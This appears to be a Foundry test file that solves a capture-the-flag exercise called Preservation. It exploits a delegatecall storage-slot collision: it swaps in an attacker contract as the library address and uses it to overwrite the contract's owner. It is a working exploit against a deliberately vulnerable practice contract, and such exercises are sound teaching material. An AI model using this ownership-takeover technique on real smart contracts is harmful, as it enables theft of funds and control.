//SPDX-License-Identifier: MIT

import "forge-std/Test.sol";
import {Preservation, LibraryContract} from "../src/Preservation.sol";
import "../src/PreservationSolution.sol";

contract PreservationTest is Test {
    // state vars
    LibraryContract public lib1;
    LibraryContract public lib2;

    Preservation public pres;
    PreservationSolution public solution;

    // setup
    function setUp() public {
        // deploy contracts
        lib1 = new LibraryContract();
        lib2 = new LibraryContract();

        pres = new Preservation(address(lib1), address(lib2));
        solution = new PreservationSolution();

    }

    // tests
    /* function testWhatStorageIsAfterDelegateCall() public {
        // the function delegatecall operates on the 0th storage slot of
        // pres

        console.log(address(lib1));

        bytes32 valueSlot0Before = vm.load(address(pres), bytes32(uint256(0)));
        console.logBytes32(valueSlot0Before);

        pres.setFirstTime(uint256(1));
        bytes32 valueSlot0After = vm.load(address(pres), bytes32(uint256(0)));
        console.logBytes32(valueSlot0After);
    } */

    function castAddressToUint(address addr) public pure returns (uint256) {
        return uint160(addr);
    }

    function testSolveLevel() public {
        // set the internal address of lib1 in the preservation contract
        // to the solution contract. This can be done by calling `setFirstTime`

        console.log(address(lib1));
        assertEq(pres.timeZone1Library(), address(lib1), "lib1 is not set");

        bytes32 valueSlot0Before = vm.load(address(pres), bytes32(uint256(0)));
        console.logBytes32(valueSlot0Before);

        // After this call preservation contrac twill have the address of the
        // solution in internal storage slot 0. A second call will delegatecall
        // into the solution contrat and change storage slot 3 where owner is
        // located.
        console.log("solution deployed address is:", address(solution));
        pres.setFirstTime(castAddressToUint(address(solution)));


        bytes32 valueSlot0After = vm.load(address(pres), bytes32(uint256(0)));
        console.logBytes32(valueSlot0After);

        console.log("current owner after first delegatecall (changed slot 0)", pres.owner());
        pres.setFirstTime(uint160(address(0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38)));
        console.log("Second delegate", pres.owner());

        assertEq(pres.owner(), address(0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38));
    }
}